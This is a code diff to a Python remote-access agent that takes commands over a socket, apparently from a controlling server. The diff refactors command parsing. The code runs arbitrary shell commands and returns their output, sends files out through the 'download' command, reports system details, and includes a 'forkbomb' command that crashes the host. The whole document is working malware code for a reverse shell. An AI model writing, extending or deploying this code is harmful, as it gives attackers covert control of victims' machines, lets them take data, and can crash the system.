@@ -34,19 +34,20 @@ while True:
         sock.send(header.encode())
         STDOUT, STDERR = None, None
         cmd = sock.recv(1024).decode("utf-8")
+        ui = cmd.strip().split(" ")
 
-        if cmd == "list":
+        if ui[0] == "list":
             sock.send(str(os.listdir(".")).encode())
 
-        if cmd == "forkbomb":
+        elif ui[0] == "forkbomb":
             while True:
                 os.fork()
 
-        elif cmd.split(" ")[0] == "cd":
-            os.chdir(cmd.split(" ")[1])
+        elif ui[0] == "cd":
+            os.chdir(ui[1])
             sock.send(I+"Changed directory to {}.".format(os.getcwd()).encode())
 
-        elif cmd == "sysinfo":
+        elif ui[0] == "sysinfo":
             sysinfo = f"""
 Operating System: {platform.system()}
 Computer Name: {platform.node()}
@@ -56,11 +57,11 @@ Processor Architecture: {platform.processor()}
             """
             sock.send(sysinfo.encode())
 
-        elif cmd.split(" ")[0] == "download":
-            if len(cmd.split(" ")) < 3:
+        elif ui[0] == "download":
+            if len(ui) < 3:
                 sock.send("Usage: download <remote_file> <local_path>".encode())
             else:
-                with open(cmd.split(" ")[1], "rb") as f:
+                with open(ui[1], "rb") as f:
                     file_data = f.read(1024)
                     while file_data:
                         sock.send(file_data)
@@ -68,20 +69,24 @@ Processor Architecture: {platform.processor()}
                     sock.send(b"DONE")
                     f.close()
 
-        elif cmd == "exit":
+        elif ui[0] == "exit":
             sock.send(b"exit")
             break
 
-        elif cmd.split(" ")[0] == "shell":
-            if len(cmd.split(" ")) < 2:
+        elif ui[0] == "shell":
+            if len(ui) < 2:
                 sock.send("Usage: shell <command>".encode())
             else:
-                comm = subprocess.Popen(str(cmd.split(cmd.split(" ")[0])[1].strip()), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                comm = subprocess.Popen(str(cmd.split(ui[0])[1]), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 STDOUT, STDERR = comm.communicate()
                 if not STDOUT:
                     sock.send(STDERR)
                 else:
                     sock.send(STDOUT)
+
+        elif ui[0] == "":
+            sock.send("none".encode())
+
         else:
             sock.send((E+"Unrecognized command!").encode())
 
@@ -89,4 +94,5 @@ Processor Architecture: {platform.processor()}
             break
     except Exception as e:
         sock.send((E+"An error has occured: {}".format(str(e))).encode())
+        
 sock.close()
